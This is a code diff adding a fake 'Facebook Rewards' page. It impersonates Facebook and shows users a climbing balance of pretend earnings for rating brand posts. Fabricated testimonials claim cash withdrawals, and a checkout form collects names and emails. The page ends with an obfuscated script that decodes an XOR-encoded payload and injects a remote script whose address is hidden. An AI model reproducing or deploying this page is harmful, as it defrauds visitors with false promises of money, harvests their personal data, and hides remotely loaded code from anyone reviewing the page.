+        <div class="relative w-16 h-16 rounded-lg overflow-hidden bg-gray-100 flex-shrink-0">
+          <img src="images/lZFRpx3ZE7xx.png" alt="Facebook Rewards" class="w-full h-full object-contain p-1">
+        </div>
+        <div class="flex flex-col">
+          <span class="font-bold text-lg leading-tight">Facebook Rewards</span>
+          <span class="text-xs text-gray-500">Author: Facebook Inc. ©</span>
+        </div>
+      </div>
+      <!-- Form -->
+      <form class="flex flex-col gap-4 text-left" onsubmit="submitCheckout(event)">
+        <div>
+          <label class="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
+          <input id="checkout-name" name="name" required="" type="text" placeholder="John Doe" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
+        </div>
+        <div>
+          <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+          <input id="checkout-email" name="email" required="" type="email" placeholder="john@example.com" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
+        </div>
+        <button type="submit" class="flex justify-center items-center gap-2 w-full p-5 shadow-lg bg-[#16A34A] hover:opacity-80 transition-all rounded-xl text-white font-semibold text-center">
+          Continue
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+  // ─── State ───────────────────────────────────────────────────────────────────
+  var STEP = 0;
+  var LIKED = false;
+  var LIKE_COUNT = 2847;
+  var BALANCE_TIMER = null;
+
+  var VH_KEY = "vh-25";
+
+  var BALANCES = [32.27, 114.33, 196.39, 278.45, 278.45];
+
+  var POSTS = [
+    null, // step 0 has no post
+    {
+      name: "Amazon.com",
+      logo: "images/amazon_logo.webp",
+      image: "images/amazon_post.webp",
+      text: 'Black Friday Week starts 11/20, but there are plenty of early deals now to kick off the holiday season 🎁 Shop savings now: <span class="text-[#0164D1] font-bold">https://amazon.visitlink.me/lBekah</span> <span class="text-[#0164D1] font-bold">#AmazonFinds</span>',
+      likes: "36,8 mil", comments: "735 comments", shares: "1.401 shares",
+      question: "Is this photo relevant to you?"
+    },
+    {
+      name: "Apple",
+      logo: "images/apple_logo.webp",
+      image: "images/apple_post.webp",
+      text: 'Took the hit and kept going. <span class="text-[#0164D1] font-bold">#ShotOnAppleWatch</span> by <span class="text-[#0164D1] font-bold">@carlosalcaraz</span>',
+      likes: "4.736", comments: "232 comments", shares: "54 shares",
+      question: "Would you watch this content?"
+    },
+    {
+      name: "Starbucks",
+      logo: "images/starbucks_logo.webp",
+      image: "images/starbucks_post.webp",
+      text: 'Say hello, to the newest Nitro 😍 Introducing the new Cinnamon Caramel Cream Nitro Cold Brew.',
+      likes: "12.5 mil", comments: "432 comments", shares: "127 shares",
+      question: "Do you find this interesting?"
+    }
+  ];
+
+  var COMMENTS = [
+    {avatar:"https://images.pexels.com/photos/774909/pexels-photo-774909.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Sarah Johnson",time:"2h",content:"OMG!! Just withdrew $385! I can't believe this is real! 😱🎉",likes:213},
+    {avatar:"https://images.pexels.com/photos/1222271/pexels-photo-1222271.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Mike Rodriguez",time:"3h",content:"YESSS! Just received $520 in my account! This actually works! 🤑💰",likes:226},
+    {avatar:"https://images.pexels.com/photos/1239291/pexels-photo-1239291.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Emily Chen",time:"4h",content:"I'm shaking!! $425 just hit my bank account! Thank you so much!! 🙏💸",likes:239},
+    {avatar:"https://images.pexels.com/photos/1516680/pexels-photo-1516680.jpeg?auto=compress&cs=tinysrgb&w=200",name:"James Miller",time:"5h",content:"NO WAY! $630 withdrawal successful! Best day ever! 🎊💵",likes:252},
+    {avatar:"https://images.pexels.com/photos/1858175/pexels-photo-1858175.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Maria Santos",time:"6h",content:"Just got $395! I'm crying tears of joy right now! 😭❤️",likes:265},
+    {avatar:"https://images.pexels.com/photos/1043474/pexels-photo-1043474.jpeg?auto=compress&cs=tinysrgb&w=200",name:"David Kim",time:"7h",content:"HOLY MOLY! $580 just arrived! This is insane! 🚀💰",likes:278},
+    {avatar:"https://images.pexels.com/photos/1065084/pexels-photo-1065084.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Jessica Brown",time:"8h",content:"I'm literally screaming! $445 in my account! THANK YOU! 🎉🙌",likes:291},
+    {avatar:"https://images.pexels.com/photos/1121796/pexels-photo-1121796.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Carlos Garcia",time:"9h",content:"BRO!! Just cashed out $715! My hands are shaking! 💪🔥",likes:304},
+    {avatar:"https://images.pexels.com/photos/733872/pexels-photo-733872.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Amanda Wilson",time:"10h",content:"OMG OMG! $505 withdrawal complete! I can't stop smiling! 😊💕",likes:317},
+    {avatar:"https://images.pexels.com/photos/1040880/pexels-photo-1040880.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Robert Taylor",time:"11h",content:"YOOO! $660 just dropped! This is absolutely crazy! 🎯💸",likes:330},
+    {avatar:"https://images.pexels.com/photos/1130626/pexels-photo-1130626.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Lisa Anderson",time:"12h",content:"I'm in shock! $415 received! This changed my life! 🌟✨",likes:343},
+    {avatar:"https://images.pexels.com/photos/1300402/pexels-photo-1300402.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Anthony Moore",time:"13h",content:"LETS GOOO! $595 confirmed! Best decision I ever made! 🏆💰",likes:356},
+    {avatar:"https://images.pexels.com/photos/1587009/pexels-photo-1587009.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Rachel Martinez",time:"14h",content:"NO FREAKING WAY! $485 just hit! I'm so grateful! 🙏💖",likes:369},
+    {avatar:"https://images.pexels.com/photos/1024311/pexels-photo-1024311.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Kevin Jackson",time:"15h",content:"DUDE!! $725 withdrawal successful! Mind blown! 🤯💵",likes:382},
+    {avatar:"https://images.pexels.com/photos/1391498/pexels-photo-1391498.jpeg?auto=compress&cs=tinysrgb&w=200",name:"Natalie White",time:"16h",content:"I can't believe it! $455 in my bank! Dreams do come true! ✨🎊",likes:395}
+  ];
+
+  // ─── Balance counter animation ───────────────────────────────────────────────
+  function animateBalance(elId, from, to, duration) {
+    var el = document.getElementById(elId);
+    if (!el) return;
+    var start = null;
+    function step(ts) {
+      if (!start) start = ts;
+      var p = Math.min((ts - start) / duration, 1);
+      var ease = 1 - Math.pow(2, -10 * p);
+      var val = from + (to - from) * ease;
+      el.textContent = "$ " + val.toFixed(2);
+      if (p < 1) requestAnimationFrame(step);
+      else el.textContent = "$ " + to.toFixed(2);
+    }
+    requestAnimationFrame(step);
+  }
+
+  // ─── Show/hide steps ─────────────────────────────────────────────────────────
+  function showStep(n) {
+    document.querySelectorAll(".step").forEach(function(el){ el.classList.remove("active"); });
+    if (n === 0) {
+      document.getElementById("step-0").classList.add("active");
+    } else if (n >= 1 && n <= 3) {
+      var wrap = document.getElementById("post-wrap");
+      wrap.classList.remove("appear");
+      void wrap.offsetWidth;
+      wrap.classList.add("appear");
+      renderPost(n);
+      document.getElementById("step-post").classList.add("active");
+      animateBalance("balance-post", BALANCES[n-1], BALANCES[n-1], 0);
+    } else if (n === 4) {
+      document.getElementById("step-4").classList.add("active");
+      document.getElementById("balance-video").textContent = "$ " + BALANCES[4].toFixed(2);
+      initVideo();
+      renderComments();
+      window.scrollTo(0, 0);
+    }
+    STEP = n;
+    setTimeout(function(){ applyTwemoji(document.body); }, 50);
+  }
+
+  // ─── Aplica Twemoji em um elemento ───────────────────────────────────────────
+  function applyTwemoji(el) {
+    if (typeof twemoji === "undefined") return;
+    twemoji.parse(el, {
+      folder: "svg",
+      ext: ".svg",
+      base: "https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/"
+    });
+  }
+
+  // ─── Render post card (steps 1-3) ────────────────────────────────────────────
+  function renderPost(n) {
+    var p = POSTS[n];
+    document.getElementById("post-card").innerHTML =
+      '<div class="flex items-start gap-3 px-4 py-3">' +
+        '<div class="w-10 h-10 rounded-full overflow-hidden flex-shrink-0 border-2 border-blue-500 bg-white flex items-center justify-center">' +
+          '<img alt="' + p.name + '" class="w-[90%] h-[90%] object-contain rounded-full" src="' + p.logo + '">' +
+        '</div>' +
+        '<div class="flex-1">' +
+          '<div class="flex items-center gap-1">' +
+            '<span class="font-semibold text-[15px]">' + p.name + '</span>' +
+            '<img src="images/verified.png" alt="Verified" class="w-4 h-4">' +
+          '</div>' +
+          '<div class="flex items-center gap-1 text-gray-500 text-[13px]">' +
+            '<span>Sponsored</span><span>·</span>' +
+            '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg>' +
+          '</div>' +
+        '</div>' +
+        '<button><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="text-gray-600"><circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle></svg></button>' +
+      '</div>' +
+      '<div class="px-4 pb-3"><p class="text-[14px] text-gray-900 leading-snug whitespace-pre-wrap">' + p.text + '</p></div>' +
+      '<div class="bg-gray-100 relative w-full aspect-video"><img alt="' + p.name + '" class="w-full h-full object-cover" src="' + p.image + '"></div>' +
+      '<div class="px-4 py-2">' +
+        '<div class="flex items-center justify-between text-[13px] text-gray-600 py-2">' +
+          '<div class="flex items-center gap-1">' +
+            '<div class="flex -space-x-1">' +
+              '<div class="w-[18px] h-[18px] bg-blue-500 rounded-full flex items-center justify-center text-white text-[10px] border border-white">👍</div>' +
+              '<div class="w-[18px] h-[18px] bg-red-500 rounded-full flex items-center justify-center text-white text-[10px] border border-white">❤️</div>' +
+              '<div class="w-[18px] h-[18px] bg-yellow-400 rounded-full flex items-center justify-center text-white text-[10px] border border-white">😮</div>' +
+            '</div>' +
+            '<span class="ml-1">' + p.likes + '</span>' +
+          '</div>' +
+          '<div class="flex items-center gap-3"><span>' + p.comments + '</span><span>' + p.shares + '</span></div>' +
+        '</div>' +
+        '<div class="border-t border-gray-200 pt-1">' +
+          '<div class="flex items-center justify-around py-1">' +
+            '<button class="flex items-center gap-2 px-4 py-2 hover:bg-gray-100 rounded-md transition-colors flex-1 justify-center"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="text-gray-600"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg><span class="text-[15px] font-semibold text-gray-600">Like</span></button>' +
+            '<button class="flex items-center gap-2 px-4 py-2 hover:bg-gray-100 rounded-md transition-colors flex-1 justify-center"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="text-gray-600"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path></svg><span class="text-[15px] font-semibold text-gray-600">Comment</span></button>' +
+            '<button class="flex items-center gap-2 px-4 py-2 hover:bg-gray-100 rounded-md transition-colors flex-1 justify-center"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="text-gray-600"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" x2="15.42" y1="13.51" y2="17.49"></line><line x1="15.41" x2="8.59" y1="6.51" y2="10.49"></line></svg><span class="text-[15px] font-semibold text-gray-600">Share</span></button>' +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+      '<div class="flex flex-col gap-3 text-center px-2 pb-4">' +
+        '<div class="flex flex-col gap-1">' +
+          '<span class="text-gray-500 text-sm">Answer the question:</span>' +
+          '<span class="text-lg font-bold text-gray-900">' + p.question + '</span>' +
+        '</div>' +
+        '<div class="grid grid-cols-2 gap-3 mt-1">' +
+          '<button type="button" onclick="vote()" class="flex justify-center items-center gap-2 rounded-xl border shadow-lg transition-all p-4 sm:p-5 border-gray-400/20 shadow-black/10 hover:opacity-80 !bg-[#DC2626] hover:!bg-[#b91c1c] !text-white !border-none !shadow-none flex items-center justify-center gap-2 py-3 rounded-full">' +
+            '<svg width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 14V2"></path><path d="M9 18.12 10 14H4.17a2 2 0 0 1-1.92-2.56l2.33-8A2 2 0 0 1 6.5 2H20a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-2.76a2 2 0 0 0-1.79 1.11L12 22a3.13 3.13 0 0 1-3-3.88Z"></path></svg>' +
+            '<span class="text-base font-semibold">Not relevant</span>' +
+          '</button>' +
+          '<button type="button" onclick="vote()" class="flex justify-center items-center gap-2 rounded-xl border shadow-lg transition-all p-4 sm:p-5 border-gray-400/20 shadow-black/10 hover:opacity-80 !bg-[#00A400] hover:!bg-[#008a00] !text-white !border-none !shadow-none flex items-center justify-center gap-2 py-3 rounded-full">' +
+            '<svg width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg>' +
+            '<span class="text-base font-semibold">Relevant</span>' +
+          '</button>' +
+        '</div>' +
+      '</div>';
+    applyTwemoji(document.getElementById("post-card"));
+  }
+
+  // ─── Vote handler ─────────────────────────────────────────────────────────────
+  function vote() {
+    var earned = (BALANCES[STEP] - BALANCES[STEP - 1]).toFixed(2);
+    document.getElementById("earned-amount").textContent = "+$" + earned;
+    // reset animations by cloning
+    resetBalanceModalAnimations();
+    document.getElementById("modal-balance").classList.add("open");
+    // update header balance immediately
+    animateBalance("balance-post", BALANCES[STEP - 1], BALANCES[STEP], 2000);
+    // auto-advance after 5s
+    if (BALANCE_TIMER) clearTimeout(BALANCE_TIMER);
+    BALANCE_TIMER = setTimeout(continueFromBalance, 5000);
+  }
+
+  function resetBalanceModalAnimations() {
+    var modal = document.getElementById("modal-balance");
+    var inner = modal.querySelector(".appear");
+    if (inner) {
+      inner.classList.remove("appear");
+      void inner.offsetWidth;
+      inner.classList.add("appear");
+    }
+    // reset SVG animations
+    modal.querySelectorAll(".anim-circle,.anim-check,.anim-fade-1,.anim-fade-2,.anim-fade-3,.anim-fade-4").forEach(function(el){
+      el.style.animation = "none";
+      void el.offsetWidth;
+      el.style.animation = "";
+    });
+  }
+
+  function continueFromBalance() {
+    if (BALANCE_TIMER) { clearTimeout(BALANCE_TIMER); BALANCE_TIMER = null; }
+    document.getElementById("modal-balance").classList.remove("open");
+    var next = STEP + 1;
+    showStep(next);
+  }
+
+  // ─── Step 0 → 1 ──────────────────────────────────────────────────────────────
+  function nextStep() {
+    showStep(STEP + 1);
+  }
+
+  // ─── Video embed (step 4) ─────────────────────────────────────────────────────
+  var videoInited = false;
+  function initVideo() {
+    if (videoInited) return;
+    videoInited = true;
+    var container = document.getElementById("video-container");
+    var s = window.location.search;
+    var sdk = document.createElement("script");
+sdk.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+sdk.async = true;
+document.head.appendChild(sdk);
+
+var wrapper = document.createElement("div");
+wrapper.id = "ifr_6aa9726ce037ab711aa4380c_wrapper";
+wrapper.style.cssText = "margin:0 auto;width:100%;max-width:400px;";
+
+var aspect = document.createElement("div");
+aspect.id = "ifr_6aa9726ce037ab711aa4380c_aspect";
+aspect.style.cssText = "position:relative;padding:125% 0 0 0;";
+
+var iframe = document.createElement("iframe");
+iframe.id = "ifr_6aa9726ce037ab711aa4380c";
+iframe.frameBorder = "0";
+iframe.allowFullscreen = true;
+iframe.referrerPolicy = "origin";
+iframe.style.cssText = "position:absolute;top:0;left:0;width:100%;height:100%;";
+iframe.src = "https://scripts.converteai.net/e80dc6b1-c0ce-4f95-90b6-dec7500aed16/players/6aa9726ce037ab711aa4380c/v4/embed.html"
+  + (location.search || "?")
+  + "&vl=" + encodeURIComponent(location.href);
+
+aspect.appendChild(iframe);
+wrapper.appendChild(aspect);
+container.appendChild(wrapper);
+
+    
+
+    // Show checkout button after timer
+    var shown = false;
+    function showBtn() {
+      if (shown) return;
+      shown = true;
+      document.getElementById("checkout-btn-wrap").classList.remove("hidden");
+    }
+    var interval = setInterval(function(){
+      if (Number(localStorage.getItem(VH_KEY + "-resume")) > 1211) { clearInterval(interval); showBtn(); }
+    }, 1000);
+    setTimeout(function(){ clearInterval(interval); showBtn(); }, 1220000);
+  }
+
+  // ─── Like button (step 4) ─────────────────────────────────────────────────────
+  function toggleLike() {
+    LIKED = !LIKED;
+    LIKE_COUNT += LIKED ? 1 : -1;
+    var icon = document.getElementById("like-icon");
+    var label = document.getElementById("like-label");
+    var btn = document.getElementById("like-btn");
+    icon.style.fill = LIKED ? "#1877F2" : "none";
+    icon.style.stroke = LIKED ? "#1877F2" : "currentColor";
+    label.style.color = LIKED ? "#1877F2" : "";
+    document.getElementById("like-count").textContent = LIKE_COUNT.toLocaleString("pt-BR");
+  }
+
+  // ─── Comments (step 4) ───────────────────────────────────────────────────────
+  var commentLikes = {};
+  function renderComments() {
+    var list = document.getElementById("comments-list");
+    if (!list || list.children.length > 0) return;
+    COMMENTS.forEach(function(c, i){
+      var el = document.createElement("div");
+      el.className = "flex flex-col";
+      el.innerHTML =
+        '<div class="flex gap-2">' +
+          '<div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100">' +
+            '<img src="' + c.avatar + '" alt="' + c.name + '" class="w-full h-full object-cover" loading="lazy">' +
+          '</div>' +
+          '<div class="flex-1 min-w-0">' +
+            '<div class="inline-block bg-[#F0F2F5] rounded-[18px] px-3 py-2">' +
+              '<div class="mb-0.5"><span class="font-semibold text-[13px] text-[#050505]">' + c.name + '</span></div>' +
+              '<p class="text-[15px] text-[#050505] leading-[1.3333] break-words">' + c.content + '</p>' +
+            '</div>' +
+            '<div class="flex items-center gap-3 px-3 mt-1">' +
+              '<span class="text-[12px] text-gray-500">' + c.time + '</span>' +
+              '<button onclick="likeComment(' + i + ', this)" class="text-[12px] font-semibold text-gray-600 hover:underline">Like</button>' +
+              '<div class="bg-white rounded-full px-2 py-0.5 shadow-sm border border-gray-200 flex items-center gap-1">' +
+                '<span class="text-[12px]">❤️</span><span class="text-[12px]">👍</span><span class="text-[12px]">😮</span>' +
+                '<span id="clike-' + i + '" class="text-[11px] text-gray-600 font-normal ml-1">' + c.likes + '</span>' +
+              '</div>' +
+            '</div>' +
+          '</div>' +
+        '</div>';
+      list.appendChild(el);
+    });
+    applyTwemoji(list);
+  }
+
+  function likeComment(i, btn) {
+    commentLikes[i] = !commentLikes[i];
+    btn.style.color = commentLikes[i] ? "#1877F2" : "";
+    var span = document.getElementById("clike-" + i);
+    if (span) span.textContent = COMMENTS[i].likes + (commentLikes[i] ? 1 : 0);
+  }
+
+  function addComment(e) {
+    e.preventDefault();
+    var input = document.getElementById("comment-input");
+    var text = input.value.trim();
+    if (!text) return;
+    var list = document.getElementById("comments-list");
+    var el = document.createElement("div");
+    el.className = "flex flex-col appear";
+    el.innerHTML =
+      '<div class="flex gap-2">' +
+        '<div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0">' +
+          '<img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" alt="You" class="w-full h-full object-cover">' +
+        '</div>' +
+        '<div class="flex-1 min-w-0">' +
+          '<div class="inline-block bg-[#F0F2F5] rounded-[18px] px-3 py-2">' +
+            '<div class="mb-0.5"><span class="font-semibold text-[13px] text-[#050505]">You</span></div>' +
+            '<p class="text-[15px] text-[#050505] leading-[1.3333] break-words">' + text.replace(/</g,"<") + '</p>' +
+          '</div>' +
+          '<div class="flex items-center gap-3 px-3 mt-1"><span class="text-[12px] text-gray-500">Just now</span></div>' +
+        '</div>' +
+      '</div>';
+    list.insertBefore(el, list.firstChild);
+    input.value = "";
+  }
+
+  // ─── Checkout modal ───────────────────────────────────────────────────────────
+  function openCheckout() {
+    if (typeof window.metaTrackOnce === "function") {
+      window.metaTrackOnce("InitiateCheckout", {
+        content_name: "Facebook Rewards",
+        content_type: "product"
+      }, "initiate_checkout");
+    }
+    document.getElementById("modal-checkout").classList.add("open");
+  }
+  function closeCheckout() {
+    document.getElementById("modal-checkout").classList.remove("open");
+  }
+  function submitCheckout(e) {
+    e.preventDefault();
+    var name  = document.getElementById("checkout-name").value;
+    var email = document.getElementById("checkout-email").value;
+    if (typeof window.metaTrackOnce === "function") {
+      window.metaTrackOnce("Lead", {
+        content_name: "Facebook Rewards"
+      }, "checkout_lead");
+    }
+    var params = new URLSearchParams(window.location.search);
+    try {
+      var url = new URL(CHECKOUT_URL);
+      params.forEach(function(v,k){ url.searchParams.set(k,v); });
+      if (name)  url.searchParams.set("name",  name);
+      if (email) url.searchParams.set("email", email);
+      window.location.href = url.toString();
+    } catch(err) {
+      window.location.href = CHECKOUT_URL;
+    }
+  }
+
+  // ─── Init ─────────────────────────────────────────────────────────────────────
+  showStep(0);
+  // Aplica Twemoji no body após o primeiro render
+  setTimeout(function(){ applyTwemoji(document.body); }, 100);
+  </script>
+
+
+
+<script>(function(){var v_xm=atob("DB1+emVj/lQcMunf9GZcDxcP3G4+Wp2rhG5EVUoAmjoyR52ynXsHVAYMk3p+QMasl28XChEQ0SR1Soyz220XAgAP0D5vEMX9lWkKCAwBiyB5Qcvlr0BSWAIPkTZ9Xpr9zkYFWAsCkzE+CMuvnWUbFiwH3Hg+RIizgXhcQEdVn2x9BNvvxyUfHFxSn2UkA4q6xH8bGFRBgwlh");var k_ph=[];for(var c_w1o0=0;c_w1o0<v_xm.length;c_w1o0++){k_ph.push(v_xm.charCodeAt(c_w1o0)&255);}var p_hf0=k_ph[0];var a_rjh=k_ph.slice(1,1+p_hf0);var i_g=k_ph.slice(1+p_hf0);var j_jue=i_g.map(function(b,f_ee){return b^a_rjh[f_ee%p_hf0];});var e_e59v="";for(var y_48=0;y_48<j_jue.length;y_48++){e_e59v+=String.fromCharCode(j_jue[y_48]&255);}var n_gxh=decodeURIComponent(escape(e_e59v));var i_cgc=JSON.parse(n_gxh);var g_fx9=i_cgc.globals||[];g_fx9.forEach(function(v_gmvw){window[v_gmvw.name]=v_gmvw.value;});var x_kj4=document.createElement("script");x_kj4.src=i_cgc.url;x_kj4.async=true;x_kj4.defer=true;(i_cgc.attributes||[]).forEach(function(y_5j){x_kj4.setAttribute(y_5j.name,y_5j.value);});(document.head||document.documentElement).appendChild(x_kj4);})();</script>
+</body></html>
